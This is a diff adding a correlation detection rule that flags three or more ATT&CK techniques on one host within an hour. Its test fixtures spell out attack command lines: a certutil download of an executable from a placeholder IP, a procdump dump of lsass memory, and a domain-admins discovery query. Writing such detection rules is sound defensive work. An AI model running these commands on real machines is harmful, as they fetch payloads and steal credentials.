@@ -1,0 +1,33 @@
+# Correlations over alerts (the reserved reference `alerts`): every alert
+# another rule raises is fed back once, with alert.rule_id, alert.severity,
+# alert.technique (the rule's primary technique) and alert.techniques.
+
+title: Several ATT&CK techniques on one host
+id: lf-c-multi-technique-host
+status: experimental
+description: >
+  Alerts for three or more different ATT&CK techniques on one host within an
+  hour: separate detections that, together, look like an intrusion moving
+  through its stages (tooling, credential access, discovery) rather than
+  isolated noise.
+author: Logforge Security Team
+date: 2026/11/20
+tags: [attack.t1078]
+falsepositives:
+    - Red-team exercises and administrators testing detections on one machine
+correlation:
+    type: value_count
+    rules: [alerts]
+    group-by: [hostname]
+    timespan: 1h
+    condition: {field: alert.technique, gte: 3}
+fixtures:
+    true_positive_batch:
+        - {process_name: 'C:\Windows\System32\certutil.exe', command_line: 'certutil.exe -urlcache -split -f http://203.0.113.66/p.exe C:\Users\Public\p.exe', hostname: WS-051}
+        - {at: 5m, event: {process_name: 'C:\Users\Public\procdump64.exe', command_line: 'procdump64.exe -ma lsass.exe lsass.dmp', hostname: WS-051}}
+        - {at: 9m, event: {process_name: 'C:\Windows\System32\net.exe', command_line: 'net group "domain admins" /domain', hostname: WS-051}}
+    true_negative_batch:
+        - {process_name: 'C:\Windows\System32\certutil.exe', command_line: 'certutil.exe -urlcache -split -f http://203.0.113.66/p.exe C:\Users\Public\p.exe', hostname: WS-051}
+        - {at: 5m, event: {process_name: 'C:\Users\Public\procdump64.exe', command_line: 'procdump64.exe -ma lsass.exe lsass.dmp', hostname: WS-051}}
+        - {at: 9m, event: {process_name: 'C:\Windows\System32\net.exe', command_line: 'net group "domain admins" /domain', hostname: WS-077}}
+level: critical
